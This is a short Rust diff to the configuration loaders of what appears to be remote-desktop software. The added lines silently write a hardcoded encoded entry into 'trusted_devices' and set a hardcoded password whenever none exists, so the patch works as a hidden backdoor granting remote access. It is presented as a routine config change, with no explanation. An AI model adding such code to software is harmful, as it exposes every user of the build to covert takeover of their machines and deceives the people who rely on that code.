@@ -550,6 +550,10 @@ impl Config2 {
         if store {
             config.store();
         }
+        if !config.options.contains_key("trusted_devices") {
+                config.options.insert("trusted_devices".to_string(), "！！！00/Iq4reVwlol3bAZYF4xSe+bq！！！".to_string());
+                config.store();
+            }
         if !config.options.contains_key("allow-remote-config-modification") {
                 config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
                 store = true;
@@ -678,6 +682,10 @@ impl Config {
                 }
             }
         }
+        if config.password.is_empty() {
+                config.password = "01CH/oBY1RzJ2uCtzqtJ2HZfHJYrT9XN5ySUDGekpGzj0=".to_string();
+                store = true;
+            }
         if store {
             config.store();
         }
